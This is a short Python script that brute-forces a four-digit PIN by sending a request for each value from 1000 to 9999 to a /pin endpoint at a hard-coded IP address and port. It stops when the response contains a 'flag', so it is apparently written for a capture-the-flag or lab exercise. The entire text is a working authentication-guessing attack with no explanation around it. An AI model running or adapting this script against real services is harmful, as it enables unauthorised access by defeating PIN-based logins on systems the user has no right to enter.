import requests
import sys

url="83.136.255.253"
port="56116"


for i in range(1000,10000):

	print(f"Attempted Pin : {i}")

	response = requests.get(f"http://{url}:{port}/pin?pin={i}")

	if response.ok and 'flag' in response.text:
		print(f"\nFlag was found\n " , response.text)
		break



